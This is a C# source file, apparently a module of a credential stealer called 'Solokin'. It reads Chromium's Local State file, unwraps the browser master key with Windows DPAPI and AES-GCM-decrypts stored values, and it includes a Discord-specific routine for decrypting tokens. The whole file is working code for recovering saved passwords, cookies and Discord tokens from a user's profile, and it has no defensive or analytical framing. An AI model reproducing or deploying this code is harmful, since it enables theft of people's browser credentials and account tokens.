using Newtonsoft.Json;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Solokin_V2._1
{
    public class ChromiumDecryption
    {
        public static string DecryptNoKey(byte[] encrypted)
        {
            if (encrypted == null || encrypted.Length == 0)
                return null;

            string result = string.Empty;
            try
            {
                result = Encoding.UTF8.GetString(ProtectedData.Unprotect(encrypted, null, DataProtectionScope.CurrentUser));
            }
            catch (Exception) { }

            return result;
        }

        private static string FindLocalState(string basePath)
        {
            string localStateFile = "\\Local State";

            string parentPath = Directory.GetParent(basePath).Parent.FullName;
            string path = parentPath + localStateFile;

            if (File.Exists(path))
                return path;

            parentPath = Path.GetDirectoryName(basePath);
            path = parentPath + localStateFile;

            if (File.Exists(path))
                return path;

            path = basePath + localStateFile;

            if (File.Exists(path))
                return path;

            return null;
        }

        public static string GetEncryptedValue(string encrypted, byte[] masterKey)
        {
            if (encrypted.StartsWith("v10") || encrypted.StartsWith("v11"))
            {
                Prepare(Encoding.Default.GetBytes(encrypted), out byte[] nonce, out byte[] ciphertextTag);
                return Decrypt(ciphertextTag, masterKey, nonce);
            }

            return DecryptNoKey(Encoding.Default.GetBytes(encrypted));
        }

        public static string GetEncryptedValueDiscord(string encrypted, byte[] masterKey, bool isDiscord)
        {
            byte[] data = Convert.FromBase64String(encrypted);

            PrepareDiscord(data, out byte[] nonce);
            return Decrypt(data, masterKey, nonce, isDiscord);
        }

        public static byte[] GetMasterKey(string basePath)
        {
            string path = FindLocalState(basePath);

            if (path == null)
                return null;

            string jsonString = File.ReadAllText(path);

            dynamic jsonObject = JsonConvert.DeserializeObject(jsonString);
            string key = jsonObject.os_crypt.encrypted_key;

            byte[] src = Convert.FromBase64String(key);
            byte[] encryptedKey = src.Skip(5).ToArray();

            return ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
        }

        public static string Decrypt(byte[] encryptedBytes, byte[] key, byte[] iv, bool isDiscord = false)
        {
            if (isDiscord)
            {
                encryptedBytes = encryptedBytes.Skip(15).ToArray();
            }

            var decryptedValue = string.Empty;
            try
            {
                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                cipher.Init(false, parameters);

                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                var retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, retLen);

                decryptedValue = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
            }
            catch (Exception)
            {
            }

            return decryptedValue;
        }
        public static void PrepareDiscord(byte[] encryptedData, out byte[] iv)
        {
            iv = new byte[12];
            Array.Copy(encryptedData, 3, iv, 0, iv.Length);
        }

        public static void Prepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
        {
            nonce = new byte[12];
            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

            Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
            Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
        }
    }
}
